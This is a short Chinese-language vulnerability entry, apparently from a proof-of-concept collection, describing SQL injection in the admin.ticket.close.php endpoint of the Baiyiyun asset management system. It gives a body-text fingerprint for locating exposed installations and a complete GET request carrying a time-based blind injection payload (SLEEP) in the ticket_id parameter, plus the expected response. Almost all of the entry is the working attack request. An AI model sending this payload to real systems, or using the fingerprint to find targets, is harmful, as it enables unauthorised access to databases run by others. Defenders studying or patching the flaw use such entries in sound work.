# 百易云资产管理系统admin.ticket.close.php存在SQL注入漏洞

百易云资产管理系统admin.ticket. ｜ SQL注入 ｜ —
- **指纹**：`body="不要着急，点此"`
- **请求**：`GET /wuser/admin.ticket.close.php?ticket_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(2)))OKTO) HTTP/1.1`
- **响应特征**：200